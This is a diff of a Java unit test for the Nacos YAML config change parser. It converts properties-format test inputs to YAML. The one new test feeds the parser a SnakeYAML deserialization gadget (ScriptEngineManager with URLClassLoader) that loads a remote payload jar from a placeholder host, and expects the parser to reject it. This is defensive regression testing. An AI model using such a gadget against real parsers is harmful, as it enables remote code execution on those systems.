@@ -14,21 +14,21 @@
  * limitations under the License.
  */
 
-package com.alibaba.nacos.client.config.listener.impl;
+package com.alibaba.nacos.client.config.impl;
 
 import com.alibaba.nacos.api.config.ConfigChangeItem;
-import com.alibaba.nacos.client.config.impl.PropertiesChangeParser;
+import com.alibaba.nacos.api.exception.runtime.NacosRuntimeException;
 import org.junit.Assert;
 import org.junit.Test;
 
 import java.io.IOException;
 import java.util.Map;
 
-public class PropertiesChangeParserTest {
+public class YmlChangeParserTest {
     
-    private final PropertiesChangeParser parser = new PropertiesChangeParser();
+    private final YmlChangeParser parser = new YmlChangeParser();
     
-    private final String type = "properties";
+    private final String type = "yaml";
     
     @Test
     public void testType() {
@@ -37,24 +37,30 @@ public class PropertiesChangeParserTest {
     
     @Test
     public void testAddKey() throws IOException {
-        Map<String, ConfigChangeItem> map = parser.doParse("", "app.name = nacos", type);
+        Map<String, ConfigChangeItem> map = parser.doParse("", "app:\n  name: nacos", type);
         Assert.assertEquals(null, map.get("app.name").getOldValue());
         Assert.assertEquals("nacos", map.get("app.name").getNewValue());
     }
     
     @Test
     public void testRemoveKey() throws IOException {
-        Map<String, ConfigChangeItem> map = parser.doParse("app.name = nacos", "", type);
+        Map<String, ConfigChangeItem> map = parser.doParse("app:\n  name: nacos", "", type);
         Assert.assertEquals("nacos", map.get("app.name").getOldValue());
         Assert.assertEquals(null, map.get("app.name").getNewValue());
     }
     
     @Test
     public void testModifyKey() throws IOException {
-        Map<String, ConfigChangeItem> map = parser.doParse("app.name = rocketMQ", "app.name = nacos", type);
+        Map<String, ConfigChangeItem> map = parser.doParse("app:\n  name: rocketMQ", "app:\n  name: nacos", type);
         Assert.assertEquals("rocketMQ", map.get("app.name").getOldValue());
         Assert.assertEquals("nacos", map.get("app.name").getNewValue());
     }
     
+    @Test(expected = NacosRuntimeException.class)
+    public void testChangeInvalidKey() {
+        parser.doParse("anykey:\n  a", "anykey: !!javax.script.ScriptEngineManager [\n"
+                + "  !!java.net.URLClassLoader [[\n"
+                + "    !!java.net.URL [\"http://[yourhost]:[port]/yaml-payload.jar\"]\n" + "  ]]\n" + "]", type);
+    }
 }
 
